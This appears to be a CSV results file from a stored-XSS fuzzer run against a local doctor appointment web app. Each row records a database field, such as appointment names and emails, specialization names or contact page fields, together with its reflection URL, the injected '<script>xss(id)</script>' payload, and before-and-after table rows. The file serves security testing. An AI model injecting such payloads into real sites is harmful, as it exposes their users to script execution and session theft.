web app,DB source,reflection sink,id,payload,description
doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,907091,"""'><script>xss(907091)</script>","
            damsmsdb.tblappointment.Name[4][2]
            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            fuzzed row: [5, 607441873, '""\'><script>xss(907091)</script>', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            change: 'Anuj kumar' => '""'><script>xss(907091)</script>'
            
fuzzed after scan 0 / 15
found as XSS in scan 1 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,909857,"""'><script>xss(909857)</script>","
            damsmsdb.tblspecialization.Specialization[2][1]
            original row: [3, 'Obstetrics and Gynecology', datetime.datetime(2022, 11, 9, 14, 24, 14)]
            fuzzed row: [3, '""\'><script>xss(909857)</script>', datetime.datetime(2022, 11, 9, 14, 24, 14)]
            change: 'Obstetrics and Gynecology' => '""'><script>xss(909857)</script>'
            
fuzzed after scan 15 / 15
found as XSS in scan 16 / 15"
doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,909964,"""'><script>xss(909964)</script>","
            damsmsdb.tblappointment.Email[4][4]
            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            fuzzed row: [5, 607441873, 'Anuj kumar', 1425362514, '""\'><script>xss(909964)</script>', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            change: 'anujkkk@hmak.com' => '""'><script>xss(909964)</script>'
            
fuzzed after scan 1 / 15
found as XSS in scan 2 / 15"
doctor,tblpage.PageDescription,http://localhost/dams/,919681,"""'><script>xss(919681)</script>","
            damsmsdb.tblpage.PageDescription[1][3]
            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            fuzzed row: [2, 'contactus', 'Contact Us', '""\'><script>xss(919681)</script>', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            change: '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)' => '""'><script>xss(919681)</script>'
            
fuzzed after scan 12 / 15
found as XSS in scan 13 / 15"
doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,921964,"""'><script>xss(921964)</script>","
            damsmsdb.tblappointment.Name[2][2]
            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            fuzzed row: [3, 485109480, '""\'><script>xss(921964)</script>', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            change: 'Tina Yadav' => '""'><script>xss(921964)</script>'
            
fuzzed after scan 0 / 15
found as XSS in scan 1 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,923583,"""'><script>xss(923583)</script>","
            damsmsdb.tblspecialization.Specialization[4][1]
            original row: [5, 'Pediatrics', datetime.datetime(2022, 11, 9, 14, 25, 6)]
            fuzzed row: [5, '""\'><script>xss(923583)</script>', datetime.datetime(2022, 11, 9, 14, 25, 6)]
            change: 'Pediatrics' => '""'><script>xss(923583)</script>'
            
fuzzed after scan 15 / 15
found as XSS in scan 16 / 15"
doctor,tblpage.Email,http://localhost/dams/,926939,"""'><script>xss(926939)</script>","
            damsmsdb.tblpage.Email[1][4]
            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            fuzzed row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', '""\'><script>xss(926939)</script>', 7896541239, None, '10:30 am to 7:30 pm']
            change: 'info@gmail.com' => '""'><script>xss(926939)</script>'
            
fuzzed after scan 13 / 15
found as XSS in scan 14 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,927505,"""'><script>xss(927505)</script>","
            damsmsdb.tblspecialization.Specialization[7][1]
            original row: [8, 'Ophthalmology', datetime.datetime(2022, 11, 9, 14, 27, 18)]
            fuzzed row: [8, '""\'><script>xss(927505)</script>', datetime.datetime(2022, 11, 9, 14, 27, 18)]
            change: 'Ophthalmology' => '""'><script>xss(927505)</script>'
            
fuzzed after scan 15 / 15
found as XSS in scan 16 / 15"
doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,934259,"""'><script>xss(934259)</script>","
            damsmsdb.tblappointment.Email[2][4]
            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            fuzzed row: [3, 485109480, 'Tina Yadav', 4654564464, '""\'><script>xss(934259)</script>', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            change: 'tina@gmail.com' => '""'><script>xss(934259)</script>'
            
fuzzed after scan 1 / 15
found as XSS in scan 2 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,936240,"""'><script>xss(936240)</script>","
            damsmsdb.tblspecialization.Specialization[3][1]
            original row: [4, 'Dermatology', datetime.datetime(2022, 11, 9, 14, 24, 42)]
            fuzzed row: [4, '""\'><script>xss(936240)</script>', datetime.datetime(2022, 11, 9, 14, 24, 42)]
            change: 'Dermatology' => '""'><script>xss(936240)</script>'
            
fuzzed after scan 15 / 15
found as XSS in scan 16 / 15"
